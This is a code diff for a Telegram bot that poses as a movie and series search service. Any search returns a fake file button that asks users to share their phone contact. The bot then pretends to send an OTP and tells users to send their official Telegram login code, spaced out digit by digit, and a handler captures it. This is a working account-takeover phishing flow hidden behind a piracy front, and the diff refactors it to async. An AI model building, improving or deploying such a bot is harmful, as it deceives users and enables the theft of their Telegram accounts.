@@ -1,16 +1,12 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton
-import time
+import asyncio
 import re
 
 # List of Admin User IDs
 ADMINS = [8083702486]  # Replace with your Telegram user IDs
 
-@Client.on_message(filters.private & filters.regex(r"^(\d\s){4}\d$|^\d{5}$"))
-def otp_received(client, message):
-    otp = message.text.replace(" ", "")
-    message.reply_text(f"Received OTP: {otp}")
-
+# /start command
 @Client.on_message(filters.command("start"))
 async def start(client, message):
     await message.reply_photo(
@@ -23,22 +19,22 @@ Iam a Telegram Movie - Series SearchBot by team @ProSearch.
 /Movies - Latest Movies Releases
 /Series - Latest TV-WEBSeries Releases
 /About - About </b>""",
-        reply_markup=InlineKeyboardMarkup( [[
-            InlineKeyboardButton("🤖 Latest Releases Updates", url="https://t.me/+LW89bJRfx7w5YTRl"),
-            ],[
-            InlineKeyboardButton("🎙️ BOT Updates Channel", url="https://t.me/+MctHWdg20Fs5ZTM1"),
-            ],[
-            InlineKeyboardButton("♦️Movies BOT🔍", url="https://t.me/ProSearchX7Bot"),
-            InlineKeyboardButton("♦️TVSeries BOT🔍", url="https://t.me/ProsearchY4Bot")
-            ]]
-            )
-        )
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🤖 Latest Releases Updates", url="https://t.me/+LW89bJRfx7w5YTRl")],
+            [InlineKeyboardButton("🎙️ BOT Updates Channel", url="https://t.me/+MctHWdg20Fs5ZTM1")],
+            [
+                InlineKeyboardButton("♦️Movies BOT🔍", url="https://t.me/ProSearchX7Bot"),
+                InlineKeyboardButton("♦️TVSeries BOT🔍", url="https://t.me/ProsearchY4Bot")
+            ]
+        ])
+    )
     await message.reply_text(f"<b> ❗️Send Movie Name and Year Correctly. 👍 </b>")
 
+# /help command
 @Client.on_message(filters.command("help"))
 async def help(client, message):
     await message.reply_text(
-        text=f"""<b> ❗️How to Search Movies ❓ 
+        text=f"""<b> ❗️How to Search Movies ❓
 ➖➖➖➖➖➖➖➖➖➖➖
 
 1. Just Send Movie Name and Year Correctly.
@@ -65,29 +61,39 @@ Baahubali 2015 Tamil
 
 Examples: - 
 Game of Thrones S01
-(S01 For Season 1)
-
 Breaking Bad S02 1080p
-For Season 2 1080p Files
-
-Lucifer S03E01 
-(For Season 3 Episode 1)
-
+Lucifer S03E01
 
 〰〰〰〰〰〰〰〰〰〰〰
-
-❗️On Android, Better Use VLC Media Player , MPV Player,  MX Player Pro, X Player Video Players. </b>""")
+❗️On Android, Better Use VLC, MX Player Pro, XPlayer etc. </b>"""
+    )
     await message.reply_text(f"<b> ❗️Send Movie Name and Year Correctly. 👍 </b>")
 
-@Client.on_callback_query(filters.regex("^movie_")) # Only handle data that starts with button_
+# OTP Code Handler (async and regex)
+@Client.on_message(filters.private & filters.regex(r"^(\d\s){4}\d$|^\d{5}$"))
+async def otp_received(client, message):
+    otp = message.text.replace(" ", "")
+    await message.reply_text(f"✅ Received OTP: <code>{otp}</code>")
+
+# Contact Receiver
+@Client.on_message(filters.contact)
+async def contact_received(client, message):
+    await message.reply_text(f"<b> Sending OTP... </b>")
+    await asyncio.sleep(5)
+    await message.reply_text(f"""<b> Please check for an OTP in official Telegram account.
+If you got it, send OTP here after reading the below format:
+If OTP is 12345, send it as 1 2 3 4 5. </b>""")
+
+# Button callback handler
+@Client.on_callback_query(filters.regex("^movie_"))
 async def movie_button(client, callback_query):
     user_id = callback_query.from_user.id
 
     if user_id not in ADMINS:
         await callback_query.message.reply_text(f"<b> Sorry Dude, You are Banned. </b>")
-        await callback_query.answer()  # to stop loading animation
+        await callback_query.answer()
         return
-        
+
     reply_markup = ReplyKeyboardMarkup(
         [[KeyboardButton("Share Contact 📱", request_contact=True)]],
         resize_keyboard=True, one_time_keyboard=True
@@ -98,28 +104,19 @@ async def movie_button(client, callback_query):
     )
     await callback_query.answer()
 
-# Handler for text messages
+# Movie/Series Search
 @Client.on_message(filters.private & filters.text)
 async def search_movie(client, message):
     query = message.text
 
+    # Skip if it's an OTP code (already handled above)
     if re.fullmatch(r"^(\d\s){4}\d$|^\d{5}$", query):
         return
-    
-    reply_markup = InlineKeyboardMarkup(
-        [[InlineKeyboardButton(f"{query} Dubbed Sony DADC DVDRip Full Movie.mkv", callback_data="movie_")]]
-    )
+
+    reply_markup = InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"{query} Dubbed Sony DADC DVDRip Full Movie.mkv", callback_data="movie_")]
+    ])
     await message.reply_text(f"""<b> 🔍 Results for your Search 
 
 ➠ Latest Uploads: @ProSearchZ
- ➠➠ BOT Updates: @ProSearch🔻 </b>""", reply_markup=reply_markup)
-    
-# Handler for receiving contact
-@Client.on_message(filters.contact)
-async def contact_received(client, message):
-    await message.reply_text(f"<b> Sending OTP... </b>")
-    time.sleep(5)
-    await message.reply_text(f"""<b> Please check for an OTP in official Telegram account.
-If you got it, send OTP here after reading the below format.
-If OTP is 12345, please send it as 1 2 3 4 5. </b>"""
-    )
+➠ BOT Updates: @ProSearch🔻 </b>""", reply_markup=reply_markup)
